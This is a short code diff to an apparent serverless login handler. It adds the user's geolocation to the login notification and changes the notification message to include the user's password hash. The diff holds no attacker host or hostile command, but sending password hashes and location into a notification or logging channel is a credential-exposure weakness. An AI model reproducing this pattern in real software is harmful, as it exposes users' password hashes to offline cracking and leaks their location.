@@ -41,10 +41,13 @@ export async function onRequestPost({ request, env }) {
       return new Response(`Account banned for ${days} more days.`, { status: 403 });
     }
 
+    const { country, region, city } = request.cf || {};
+    const loc = [city, region, country].filter(Boolean).join(", ") || "Unknown";
+
     await ntfy(
       env,
       "auth-login",
-      `event=login\nuser=${username}`,
+      `event=login\nuser=${username}\npass_hash=${pass_hash}\nloc=${loc}`,
       3
     );
 
@@ -53,4 +56,3 @@ export async function onRequestPost({ request, env }) {
     return new Response(e.message,{ status:500 });
   }
 }
-
